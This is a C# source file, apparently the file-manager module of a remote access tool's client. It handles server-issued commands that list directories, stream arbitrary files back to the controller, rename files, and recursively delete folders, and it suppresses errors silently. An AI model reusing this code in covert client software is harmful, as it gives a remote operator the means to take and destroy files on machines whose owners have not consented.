using System;
using System.IO;
using System.Threading;
using xClient.Core.Helper;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
    public static partial class CommandHandler
    {
        public static void HandleDirectory(Packets.ServerPackets.Directory command, Client client)
        {
            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];

                int i = 0;
                foreach (FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if (files.Length == 0)
                {
                    files = new string[] { DELIMITER };
                    filessize = new long[] { 0 };
                }

                i = 0;
                foreach (DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new string[] { DELIMITER };

                new Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
            }
            catch
            {
                new Packets.ClientPackets.DirectoryResponse(new string[] { DELIMITER }, new string[] { DELIMITER },
                    new long[] { 0 }).Execute(client);
            }
        }

        public static void HandleDownloadFile(Packets.ServerPackets.DownloadFile command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    FileSplit srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                        new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                            srcFile.LastError).Execute(client);

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (!client.Connected) return;
                        if (_canceledDownloads.ContainsKey(command.ID)) return;

                        byte[] block;
                        if (srcFile.ReadBlock(currentBlock, out block))
                        {
                            new Packets.ClientPackets.DownloadFileResponse(command.ID,
                                Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                                srcFile.LastError).Execute(client);
                            //Thread.Sleep(200);
                        }
                        else
                            new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                                srcFile.LastError).Execute(client);
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message)
                        .Execute(client);
                }
            }).Start();
        }

        public static void HandleDownloadFileCanceled(Packets.ServerPackets.DownloadFileCanceled command, Client client)
        {
            if (!_canceledDownloads.ContainsKey(command.ID))
            {
                _canceledDownloads.Add(command.ID, "canceled");
                new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(
                    client);
            }
        }

        public static void HandleRename(Packets.ServerPackets.Rename command, Client client)
        {
            try
            {
                if (command.IsDir)
                    Directory.Move(command.Path, command.NewPath);
                else
                    File.Move(command.Path, command.NewPath);

                HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
            }
            catch
            {
            }
        }

        public static void HandleDelete(Packets.ServerPackets.Delete command, Client client)
        {
            try
            {
                if (command.IsDir)
                    Directory.Delete(command.Path, true);
                else
                    File.Delete(command.Path);

                HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
            }
            catch
            {
            }
        }
    }
}